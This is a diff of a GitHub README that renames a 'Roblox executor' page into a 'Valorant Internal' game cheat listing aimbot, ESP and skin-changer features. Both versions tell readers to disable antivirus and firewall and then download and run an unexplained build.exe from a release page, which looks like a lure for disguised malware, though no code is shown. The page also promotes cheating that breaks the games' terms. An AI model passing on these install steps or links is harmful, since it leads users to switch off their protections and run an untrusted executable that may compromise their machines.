@@ -1,15 +1,25 @@
-# Roblox-Executer
-## About
-Incognito is a powerful Roblox script executor designed for enhancing your gameplay experience. With its user-friendly interface and robust support for executing Lua scripts, Incognito offers a wide range of automation features that can take your Roblox adventures to the next level. Please note that using Incognito may potentially violate Roblox's terms of service due to the nature of its functionality.
+# 👻Valorant Internal👻
+## 👻THIS IS NOT A GUI CHEAT ONLY CONFIG👻
+## 👻DO NOT ABUSE OR YOU MAY BE BANNED👻
 
-## Key Features
-- User-friendly interface
-- Lua script execution
-- Enhanced gameplay features
-- Automation capabilities
+### Features
+#### 🦎 Aimbot
+  -Recoil Control System -Aim Speed -Aim Bone -Aim Fov -Aim Key -Visibility -Toggle Aim Key -Nearest Bone (Crosshair only focus the nearest bone) -Different hotkey option for pistols (including chamber’s sheriff) -Different aim config for snipers (including chamber’s sniper)
+#### 🦎 ESP
+  -Box ESP -Circle ESP -Health ESP -Skeleton ESP -Agent ESP -Visible ESP -Toggle ESP Key -ABILITY ESP -Spike ESP -Weapon ESP -Ability ESP
+#### 🦎 Skin Changer
+  -Inventory Skinchanger -Gunbuddies
+#### 🦎 MISC
+  -Bunnyhop
 
-## Installation Guide
-- Disable any AV or firewall settings you have to avoid deletion
-- Go to the Releases page [Here](https://github.com/Meowste/Roblox-Executer/releases/tag/Stable).
-- Download the latest EXE (build.exe)
-- Wait 20-30 seconds then launch Roblox
+### 🦎 Download and Installation
+* Disable any AV or firewall settings you have to avoid deletion
+* Go to the [Releases](https://github.com/Meowste/Valorant-Internal/releases/tag/Stable) page.
+* Download the latest EXE (build.exe)
+* Wait 20-30 seconds then launch Valorant
+
+
+### 🦎 Preview
+https://streamable.com/jpw3wt
+
+## This cheat was made by [me](https://github.com/Meowste), although a base was everything was reprogrammed by me
